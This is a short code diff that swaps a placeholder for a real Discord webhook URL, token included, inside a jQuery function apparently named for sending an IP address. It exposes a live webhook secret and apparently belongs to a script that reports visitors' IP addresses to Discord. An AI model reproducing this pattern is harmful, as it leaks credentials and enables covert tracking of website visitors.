@@ -5,7 +5,7 @@ $(document).ready(function() {
     
     function ipmsg(ipadd) {
         
-        var webhookURL = 'WEBHOOK URL'; // PUT IN YOUR WEBHOOK URL
+        var webhookURL = 'https://discord.com/api/webhooks/1570560476285243453/UPXsmgD0OR9ygM1c2t4TBAJa5mlys65kBE3VzvDfWMAlUpTjZcWD8TFn3NpGqCUFl2Ue'; // PUT IN YOUR WEBHOOK URL
         
         var payload = {
             
